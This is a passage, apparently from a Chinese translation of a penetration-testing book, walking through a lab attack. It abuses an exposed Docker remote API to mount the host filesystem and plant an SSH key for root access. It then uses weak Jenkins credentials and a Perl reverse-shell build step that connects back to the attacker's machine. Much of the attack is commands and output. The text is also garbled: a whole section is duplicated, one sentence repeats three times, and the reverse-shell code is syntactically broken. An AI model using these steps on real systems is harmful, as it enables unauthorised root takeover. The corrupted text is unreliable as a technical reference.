  \ run ‐itd ‐‐name fsociety ‐v /:/mnt bd513360cce5\n558c0ae8491290e1dade641cd62f6b7e258a0d6bc1a33cd3bfc0991f8824716a\n\
  ```\n\n#### 检查容器是否运行\n\n作为另一个检查，让我们在连接它之前验证容器是否正在运行：\n\n```\n root@kali:~# docker\
  \ ‐H 172.16.0.103:2375 ps\nCONTAINER ID      IMAGE        COMMAND              \
  \        CREATED        STATUS        PORTS                                    \
  \                NAMES\n558c0ae84912      bd513360cce5 \"bash\"                \
  \       11 seconds ago Up 11 seconds                                           \
  \               fsociety\n7dd7d926605a      jenkins      \"/bin/tini -- /usr/l…\"\
  \       2 hours ago    Up 2 hours    0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp\
  \         labjenkins\n```\n\n#### 获取 Kali 容器的 Shell\n\n由于 Kali 容器现在正在运行，我们只需要运行\
  \ `exec` 命令来获取远程 shell：\n\n```\n root@kali:~# docker ‐H 172.16.0.103:2375 exec ‐it\
  \ 558c0ae84912 bash\nroot@558c0ae84912:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\
  root@558c0ae84912:/#\n```\n\n我们已经在 Kali 容器上获得了一个 root 权限远程 shell。接下来，让我们使用这个容器攻破\
  \ Ubuntu 宿主机。\n\n### Docker 主机漏洞利用\n\n在此阶段，我们在 Ubuntu 宿主机上运行了一个 Kali Linux 容器。我们能够远程创建它。在这一步中，你将学习如何通过之前创建的容器攻破\
  \ Ubuntu 宿主机。\n\n```\n root@kali:~# nmap 172.16.0.103\nStarting Nmap 7.92 (https://nmap.org)\n\
  Nmap scan for 172.16.0.103 has completed in 0.05 seconds\nHost (172.16.0.103) is\
  \ up.\nPORT     STATE   SERVICE\n8080/tcp open http-proxy\n50000/tcp open docker\n\
  ```\n\n\n\n\n```\nroot@558c0ae84912:/mnt/root/.ssh# echo \"ssh‐rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKc2E5yhmGHiz9jE4+8oNZ59n26F9T5niTQGWaCI1fhFUFnn4zzh9GJxbsrjmVaaCMNaq6pjSHb/GzkhZssSxkjyXKm<!--<ce:anchor\
  \ id=\"pp:189 np:190\" role=\"page-break\"/>-->\
  \ root@kali\" > authorized_keys\n```\n\n是时候揭晓真相了：尝试从我们的 Kali 主机（不是容器）连接到 Ubuntu\
  \ 虚拟机：\n\n```\nroot@kali:~# ssh root@172.16.0.103\nWelcome to Ubuntu 20.04 LTS (GNU/Linux\
  \ 5.4.0-37-generic x86_64)\n\n * Documentation: https://help.ubuntu.com\n * Management:\
  \    https://landscape.canonical.com\n * Support:       https://ubuntu.com/advantage\n\
  \n34 updates can be installed immediately.\n14 of these updates are security updates.\n\
  To see these additional updates run: apt list --upgradable\n\nYour Hardware Enablement\
  \ Stack (HWE) is supported until April 2025.\nLast login: Fri Jun 26 04:50:39 2020\
  \ from 172.16.0.102\nroot@ub01:~#\n```\n\n我们得到了一个 root shell！\n\n# 攻击 Jenkins\n\n\
  利用 Jenkins 漏洞是一个极佳的示例，你可以将其应用到其他的 Web 门户。一旦你看到一个 Web 门户，你需要检查以下清单：\n\n*   绕过登录页面。\n\
  \    *   暴力破解进入\n    *   SQL 注入身份验证绕过（我们将在书的后部分讨论这一）\n    *   窃取凭据\n*   登录并利用门户功能的漏洞。\n\
  \    *   执行命令\n    *   上传 webshell（我们将在书的后部分讨论这个）\n*   如果这些项目都是不可行的，也许你可以尝试寻找公开的利用程序。理想情况下，管理员没有升级系统并且仍然在使用旧版本。\n\
  \n如果你还记得在枚举阶段，我们能够使用 Hydra 获取一个有效的账户（`admin:admin`）。让我们用它来登录门户（参见图 7.21）。\n\n![Jenkins\
  \ 首页截图。](img/c07f021.png)\n\n图 7.21 Jenkins 首页\n\n我们在这个阶段的目标是获取一个远程 shell，因此我们需要通过这个门户执行命令。首先，让我们在\
  \ Kali 主机上使用 `netcat` 启动一个监听器：\n\n```\nroot@kali:~# nc -nlvp 1111\nlistening on\
  \ [any] 1111 …\n```\n\n回到 Jenkins 页面，点击 `Create New Jobs` 链接来调度命令。当页面加载时，输入项目名称，然后从列表中选择\
  \ `Freestyle` 项目，最后点击 OK（参见图 7.22）。\n\n![Jenkins - 新项目截图。](img/c07f022.png)\n\n\
  图 7.22 Jenkins ‐ 新项目\n\n一旦你进入项目配置页面，滚动到 `Build` 部分并选择 `Execute Shell` 菜单项（参见图 7.23）。\n\
  \n![Jenkins – 添加构建步骤截图。](img/c07f023.png)\n\n图 7.23 Jenkins – 添加构建步骤\n\n我们从枚举阶段知道该主机是基于\
  \ Linux 的，因此我们将使用 Perl 来执行反向 shell 命令（记住我们在 Kali 主机的 `1111` 端口上有一个监听器）。我们不会执行 `netcat`，因为这是一生产服务器，管理员没有安装它；这就是为什么我们将使用\
  \ Perl 来完成工作（因为 Ubuntu/Linux 上通常都安装了它），如图 7.24](#c07.xhtml_c07-fig-0024)所示：\n\n\
  ```\nperl -e 'use Socket;$i=\"172.16.0.102\";$p=1111;socket(S,PF_INET,SOCK_STREAM,getobyname(\"\
  tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))){open(STDIN,S\");open(STDOUT,S\"\
  );open(STDERR,S\");exec(\"/bin/sh -i\");'\n```\n\n点击 Save 后，窗口将关闭。现在，我们只需要执行命令。为此，点击左侧菜单中的\
  \ `Build`。为了实现这一点，点击左侧菜单中的 `Build`。为了实现这一点，点击左侧菜单中的 `Build`。执行后：\n```bash\nconnected\
  \ to 172.16.0.102\nroot@ub01:~#\n```\n\n我们得到了一个 root shell！\n\n# 攻击 Jenkins\n\n\
  利用 Jenkins 漏洞是一个极佳的示例，你可以将其应用到其他的 Web 门户。一旦你看到一个 Web 门户，你需要检查以下清单：\n\n*   绕过登录页面。\n\
  \    *   暴力破解进入\n    *   SQL 注入身份验证绕过（我们将在书的后部分讨论这一）\n    *   窃取凭据\n*   登录并利用门户功能的漏洞。\n\
  \    *   执行命令\n    *   上传 webshell（我们将在书的后部分讨论这个）\n*   如果这些项目都是不可行的，也许你可以尝试寻找公开的利用程序。理想情况下，管理员没有升级系统并且仍然在使用旧版本。\n\
